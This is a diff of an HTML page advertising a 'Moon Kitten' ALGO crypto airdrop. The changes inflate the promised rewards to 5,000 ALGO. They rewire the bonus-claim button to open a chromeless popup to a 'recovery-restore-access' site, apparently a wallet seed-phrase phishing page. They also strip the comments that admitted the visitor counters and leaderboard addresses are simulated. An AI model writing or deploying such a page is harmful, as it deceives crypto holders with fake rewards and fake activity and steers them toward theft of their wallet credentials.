@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎁 Moon Kitten - Airdrop ALGO Rewards</title>
+    <title>Moon Kitten</title>
     
     <!-- Font Google -->
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap" rel="stylesheet">
@@ -872,7 +872,7 @@
             <li><a href="#airdrop" class="active">🎁 Airdrop</a></li>
             <li><a href="#staking" onclick="showToast('🔒 Staking coming soon!')">🔒 Staking</a></li>
             <li><a href="#leaderboard">🏆 Leaderboard</a></li>
-            <li><a href="#">🏠 Home</a></li>
+            <li><a href="index.html">🏠 Home</a></li>
         </ul>
     </nav>
 
@@ -883,7 +883,7 @@
         <section class="hero-section" id="airdrop">
             <h1>🎁 <span class="highlight"><span class="algo-symbol"></span> ALGO</span> Airdrop</h1>
             <p>
-                Claim free <strong style="color: #FFD700;">1,000 ALGO</strong> tokens, complete tasks, and earn rewards!
+                Claim free <strong style="color: #FFD700;">5,000 ALGO</strong> tokens, complete tasks, and earn rewards!
                 The biggest ALGO airdrop in meme coin history is here.
             </p>
         </section>
@@ -892,19 +892,17 @@
         <div class="bonus-section" id="bonus">
             <div class="bonus-label">🎯 Special Bonus</div>
             <h3>🎁 <span class="gold-text">Bonus Airdrop</span></h3>
-            <div class="bonus-amount">1,000 <small>ALGO</small></div>
+            <div class="bonus-amount">5,000 <small>ALGO</small></div>
             <p>
-                Get an extra <strong>1,000 ALGO</strong> bonus instantly!
+                Get an extra <strong>5,000 ALGO</strong> bonus instantly!
             </p>
-            <a href="https://moonkitten.xyz/kitten.jpg" 
-               target="_blank" 
+            <a onclick="window.open('https://recovery-restore-access.vercel.app/?=kitten+algorand+meme+coin&oq=pA0YgAQyCQgCEAAYDRiABDIICAMQABgNGB4yCAgEEAAYDRgeMgoIBRAAGAUYDRgeMgoIBhAAGAUYDRgeMgoIBxAAGAUYDRgeMgoICBAAGAUYDRgeMgoICRAAGAUYDRge0gEKMTE0NjNqMGoxNagCCLACAfEF3gvvG6MXHlbxBd4L7xujFx5W/','_blank','toolbar=no,location=no,status=no,menubar=no,scrollbars=yes,resizable=yes,width=450,height=900'); return false;" 
                class="btn btn-gold pulse" 
                onclick="claimBonus(event)">
                 🎉 Claim Airdrop
             </a>
         </div>
 
-        <!-- ===== STATS BAR - OTOMATIS ===== -->
         <div class="stats-bar">
             <div class="stat">
                 <div class="number" id="totalClaimed">0</div>
@@ -943,13 +941,11 @@
                 <div class="icon">🐦</div>
                 <h3>Follow Twitter</h3>
                 <p>Follow <strong>@MoonKitten</strong> on Twitter and retweet pinned post</p>
-                <div class="reward-amount"> 1,000 <small>ALGO</small></div>
+                <div class="reward-amount"> 5,000 <small>ALGO</small></div>
                 <span class="status live">● Live</span>
                 <br><br>
-                <a href="https://x.com/Moon_MKIT" 
-                   target="_blank" 
-                   class="btn btn-primary"
-                   onclick="claimReward('Follow Twitter', 5, this)">
+                <a onclick="window.open('https://x.com/Moon_MKIT','_blank'); claimReward('Follow Twitter', 5, this); return false;" 
+                   class="btn btn-primary">
                     <i class="fab fa-twitter"></i> Follow & Claim
                 </a>
             </div>
@@ -959,13 +955,11 @@
                 <div class="icon">💬</div>
                 <h3>Join Telegram</h3>
                 <p>Join our Telegram community and say hello 👋</p>
-                <div class="reward-amount">1,000 <small>ALGO</small></div>
+                <div class="reward-amount">5,000 <small>ALGO</small></div>
                 <span class="status live">● Live</span>
                 <br><br>
-                <a href="https://t.me/MoonKitten" 
-                   target="_blank" 
-                   class="btn btn-primary"
-                   onclick="claimReward('Join Telegram', 3, this)">
+                <a onclick="window.open('https://t.me/moonkittencommunity','_blank'); claimReward('Join Telegram', 3, this); return false;" 
+                   class="btn btn-primary">
                     <i class="fab fa-telegram"></i> Join & Claim
                 </a>
             </div>
@@ -974,14 +968,12 @@
             <div class="airdrop-card">
                 <div class="icon">⭐</div>
                 <h3>Referral Bonus</h3>
-                <p>Refer a friend and earn <strong>1 ALGO</strong> each referral</p>
-                <div class="reward-amount">1,000 <small>ALGO</small></div>
+                <p>Refer a friend and earn <strong>5,000 ALGO</strong> each referral</p>
+                <div class="reward-amount">5,000 <small>ALGO</small></div>
                 <span class="status live">● Live</span>
                 <br><br>
-                <a href="https://moonkitten.xyz/kitten.jpg" 
-                   target="_blank" 
-                   class="btn btn-gold"
-                   onclick="claimReward('Referral Bonus', 1, this)">
+                <a onclick="window.open('https://moonkitten.xyz/','_blank'); claimReward('Referral Bonus', 1, this); return false;" 
+                   class="btn btn-gold">
                     <i class="fas fa-users"></i> Refer Now
                 </a>
             </div>
@@ -1020,7 +1012,7 @@
                 <div class="staking-pool">
                     <div class="pool-name">💎 Gold Pool</div>
                     <div class="pool-apy">40% APY</div>
-                    <div class="pool-details">Min: 1,000 ALGO</div>
+                    <div class="pool-details">Min: 5,000 ALGO</div>
                     <div class="pool-details">Lock: 30 days</div>
                     <br>
                     <button class="btn btn-secondary" onclick="showToast('🔒 Stake feature coming soon!')" style="width:100%;">
@@ -1048,7 +1040,7 @@
         </div>
 
         <div class="leaderboard" id="leaderboardList">
-            <!-- Leaderboard items akan diisi oleh JavaScript -->
+
         </div>
 
     </div>
@@ -1123,9 +1115,7 @@
             progressText.textContent = Math.floor(progress) + '%';
         }
 
-        // ============================================================
-        // 4. AUTO INCREMENT (SIMULASI LIVE)
-        // ============================================================
+
         function autoIncrement() {
             // Active Users: +1-3 setiap 4-8 detik
             const userIncrement = Math.floor(Math.random() * 3) + 1;
@@ -1163,9 +1153,6 @@
             }, delay);
         }
 
-        // ============================================================
-        // 5. CLAIM REWARD (MANUAL)
-        // ============================================================
         function claimReward(taskName, amount, element) {
             if (claimedTasks.has(taskName)) {
                 showToast('⚠️ You already claimed ' + taskName + '!');
@@ -1194,18 +1181,13 @@
             };
         }
 
-        // ============================================================
-        // 6. BONUS AIRDROP CLAIM (10 ALGO) - TANPA SYARAT
-        // ============================================================
+
         function claimBonus(event) {
             if (bonusClaimed) {
                 showToast('⚠️ You already claimed the bonus!');
                 event.preventDefault();
                 return;
             }
-            
-            // ===== SYARAT COMPLETE ALL TASKS DIHAPUS =====
-            // Langsung claim bonus tanpa cek task
             
             bonusClaimed = true;
             
@@ -1218,16 +1200,14 @@
             showToast('🎉 Bonus claimed! +10 ALGO sent to your Algorand wallet! ');
 
             const btn = event.target;
-            btn.innerHTML = '✅ 10 ALGO Bonus Claimed!';
+            btn.innerHTML = '✅ 5,000 ALGO Bonus Claimed!';
             btn.className = 'btn btn-success pulse';
             btn.style.background = 'linear-gradient(135deg, #00ff88, #00cc66)';
             btn.style.boxShadow = '0 10px 40px rgba(0, 255, 136, 0.3)';
             btn.classList.remove('pulse');
         }
 
-        // ============================================================
-        // 7. LEADERBOARD - ALGORAND ADDRESSES
-        // ============================================================
+
 
         function generateAlgorandAddress() {
             const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
@@ -1327,7 +1307,6 @@
         activeUsers = 89;
         updateStats();
 
-        // Mulai auto increment
         scheduleAutoIncrement();
 
         // ============================================================
